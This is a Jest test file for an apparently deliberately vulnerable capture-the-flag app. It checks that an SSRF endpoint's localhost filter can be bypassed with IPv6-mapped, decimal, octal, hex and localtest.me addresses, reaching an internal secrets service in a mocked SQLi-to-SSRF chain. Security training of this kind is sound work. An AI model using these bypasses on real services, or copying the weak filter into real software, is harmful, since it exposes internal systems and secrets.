/**
 * Phase 4 Integration Tests: SSRF Filter Bypass
 * Tests SSRF vulnerability and filter bypass techniques
 */

import request from 'supertest';
import express from 'express';
import { createAsgardRouter } from '../../src/routes/asgard';
import { EmployeeService } from '../../src/services/employee-service';
import { DocumentService } from '../../src/services/document-service';
import { ScreenshotService } from '../../src/services/screenshot-service';
import { DatabaseService } from '../../src/services/database';
import { RealmConfig } from '../../src/config';
import axios from 'axios';

// Mock dependencies
jest.mock('../../src/services/database');
jest.mock('axios');

const mockedAxios = axios as jest.Mocked<typeof axios>;

describe('Phase 4: SSRF Filter Bypass', () => {
  let app: express.Application;

  const mockConfig: RealmConfig = {
    port: 3000,
    flag: 'YGGDRASIL{ASGARD:test}',
    realmName: 'asgard',
    nodeEnv: 'test',
    databaseUrl: 'mock://db'
  };

  beforeEach(() => {
    app = express();
    app.use(express.json());

    const mockDb = new DatabaseService('mock://db') as jest.Mocked<DatabaseService>;
    const documentService = new DocumentService(mockDb);
    const employeeService = new EmployeeService(mockDb);
    const screenshotService = new ScreenshotService();

    app.use(createAsgardRouter(mockConfig, documentService, employeeService, screenshotService));
  });

  describe('1. Odin-View Endpoint', () => {
    test('POST /api/odin-view should exist', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { test: 'data' }
      });

      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://example.com' })
        .expect(200);

      expect(response.body).toHaveProperty('success');
    });

    test('should require URL parameter', async () => {
      const response = await request(app)
        .post('/api/odin-view')
        .send({})
        .expect(400);

      expect(response.body.error).toContain('url required');
    });
  });

  describe('2. Filter Blocking (Basic)', () => {
    test('should block direct localhost access', async () => {
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://localhost:9090/metadata/secrets' });

      expect(response.body.success).toBe(false);
      expect(response.body.filterResult.blocked).toBe(true);
      expect(response.body.filterResult.reason).toContain('localhost');
    });

    test('should block 127.0.0.1', async () => {
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://127.0.0.1:9090' });

      expect(response.body.success).toBe(false);
      expect(response.body.filterResult.blocked).toBe(true);
    });

    test('should block private IP ranges', async () => {
      const privateIPs = [
        'http://10.0.0.1:9090',
        'http://172.16.0.1:9090',
        'http://192.168.1.1:9090'
      ];

      for (const url of privateIPs) {
        const response = await request(app)
          .post('/api/odin-view')
          .send({ url });

        expect(response.body.filterResult.blocked).toBe(true);
      }
    });

    test('should provide bypass hints when blocked', async () => {
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://localhost:9090' });

      expect(response.body.filterResult.bypassHints).toBeDefined();
      expect(response.body.hint).toBeDefined();
    });
  });

  describe('3. Bypass Technique 1: IPv6 Notation', () => {
    test('EXPLOIT: IPv6-mapped IPv4 should bypass filter', async () => {
      const mockMetadataResponse = {
        success: true,
        service: 'internal-metadata',
        secrets: [
          {
            secret_type: 'flag',
            secret_key: 'asgard_master_key',
            secret_value: 'YGGDRASIL{ASGARD:test-flag}'
          }
        ]
      };

      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: mockMetadataResponse
      });

      // BYPASS: Use IPv6 notation
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://[::ffff:127.0.0.1]:9090/metadata/secrets' });

      // Should NOT be blocked
      expect(response.body.success).toBe(true);
      expect(response.body.data).toEqual(mockMetadataResponse);
      expect(response.body.data.secrets[0].secret_value).toContain('YGGDRASIL');
    });
  });

  describe('4. Bypass Technique 2: Decimal IP', () => {
    test('EXPLOIT: Decimal IP encoding should bypass filter', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { success: true }
      });

      // 127.0.0.1 = 2130706433 in decimal
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://2130706433:9090/metadata/secrets' });

      // Should NOT be blocked
      expect(response.body.success).toBe(true);
    });
  });

  describe('5. Bypass Technique 3: Octal Encoding', () => {
    test('EXPLOIT: Octal IP should bypass filter', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { success: true }
      });

      // 0177.0.0.1 is octal for 127.0.0.1
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://0177.0.0.1:9090/metadata/secrets' });

      // Should NOT be blocked
      expect(response.body.success).toBe(true);
    });
  });

  describe('6. Bypass Technique 4: Hexadecimal', () => {
    test('EXPLOIT: Hex IP should bypass filter', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { success: true }
      });

      // 0x7f.0x0.0x0.0x1 is hex for 127.0.0.1
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://0x7f.0x0.0x0.0x1:9090/metadata/secrets' });

      // Should NOT be blocked
      expect(response.body.success).toBe(true);
    });
  });

  describe('7. Bypass Technique 5: DNS Tricks', () => {
    test('EXPLOIT: localtest.me should bypass filter', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { success: true }
      });

      // localtest.me resolves to 127.0.0.1
      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://localtest.me:9090/metadata/secrets' });

      // Should NOT be blocked
      expect(response.body.success).toBe(true);
    });
  });

  describe('8. Filter Test Endpoint', () => {
    test('POST /api/odin-view/test-filter should exist', async () => {
      const response = await request(app)
        .post('/api/odin-view/test-filter')
        .send({ url: 'http://localhost:9090' })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.filterResult).toBeDefined();
    });

    test('should test URLs without making requests', async () => {
      // Clear mock calls from previous tests
      mockedAxios.get.mockClear();
      
      const response = await request(app)
        .post('/api/odin-view/test-filter')
        .send({ url: 'http://localhost:9090' });

      expect(response.body.filterResult.blocked).toBe(true);
      expect(mockedAxios.get).not.toHaveBeenCalled();
    });
  });

  describe('9. Bypass Hints Endpoint', () => {
    test('GET /api/odin-view/bypass-hints should return hints', async () => {
      const response = await request(app)
        .get('/api/odin-view/bypass-hints')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.hints).toBeDefined();
      expect(Array.isArray(response.body.hints)).toBe(true);
      expect(response.body.bypasses).toBeDefined();
      expect(Array.isArray(response.body.bypasses)).toBe(true);
    });

    test('should list all bypass techniques', async () => {
      const response = await request(app)
        .get('/api/odin-view/bypass-hints');

      const bypasses = response.body.bypasses;
      const techniques = bypasses.map((b: any) => b.technique);
      
      expect(techniques).toContain('ipv6');
      expect(techniques).toContain('decimal');
      expect(techniques).toContain('octal');
      expect(techniques).toContain('hex');
      expect(techniques).toContain('dns');
    });
  });

  describe('10. Full SSRF Chain (Phase 3→4)', () => {
    test('complete chain: SQLi → SSRF → Metadata → FLAG', async () => {
      // Phase 3 result: Extracted metadata URL via blind SQLi
      const metadataUrl = 'http://localhost:9090';
      
      // Phase 4: Use IPv6 bypass to access metadata service
      const mockFlag = 'YGGDRASIL{ASGARD:81892ad5-e169-4165-89fe-ab25348325e0}';
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: {
          success: true,
          service: 'internal-metadata',
          secrets: [
            {
              secret_type: 'flag',
              secret_key: 'asgard_master_key',
              secret_value: mockFlag
            }
          ]
        }
      });

      // Step 1: Test direct access (blocked)
      const directAttempt = await request(app)
        .post('/api/odin-view')
        .send({ url: `${metadataUrl}/metadata/secrets` });
      
      expect(directAttempt.body.filterResult.blocked).toBe(true);

      // Step 2: Use IPv6 bypass
      const bypassUrl = metadataUrl.replace('localhost', '[::ffff:127.0.0.1]');
      const bypassAttempt = await request(app)
        .post('/api/odin-view')
        .send({ url: `${bypassUrl}/metadata/secrets` });

      // Success! Filter bypassed
      expect(bypassAttempt.body.success).toBe(true);
      expect(bypassAttempt.body.data.secrets[0].secret_value).toBe(mockFlag);
      
      // FLAG extracted via SSRF
      const flag = bypassAttempt.body.data.secrets[0].secret_value;
      expect(flag).toMatch(/^YGGDRASIL\{ASGARD:[a-f0-9-]+\}$/);
    });
  });

  describe('11. Allow List (Non-Blocked URLs)', () => {
    test('should allow external URLs', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: { test: 'data' }
      });

      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'http://example.com' });

      expect(response.body.success).toBe(true);
      expect(mockedAxios.get).toHaveBeenCalledWith(
        'http://example.com',
        expect.any(Object)
      );
    });

    test('should allow HTTPS URLs', async () => {
      mockedAxios.get.mockResolvedValue({
        status: 200,
        data: {}
      });

      const response = await request(app)
        .post('/api/odin-view')
        .send({ url: 'https://api.github.com' });

      expect(response.body.success).toBe(true);
    });
  });
});
